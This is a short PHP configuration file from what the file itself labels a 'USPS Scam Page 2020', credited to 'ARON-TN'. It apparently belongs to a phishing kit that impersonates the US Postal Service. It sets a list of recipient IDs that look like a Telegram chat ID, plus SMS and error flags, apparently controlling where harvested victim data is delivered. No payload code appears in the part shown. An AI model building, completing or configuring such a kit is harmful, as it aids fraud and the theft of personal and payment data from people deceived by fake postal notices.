<?php
/* 
USPS Scam Page 2020
CODED BY ARON-TN
*/
$user_ids=array("-1001323313944");
$sms='2';
$error='0';
?>
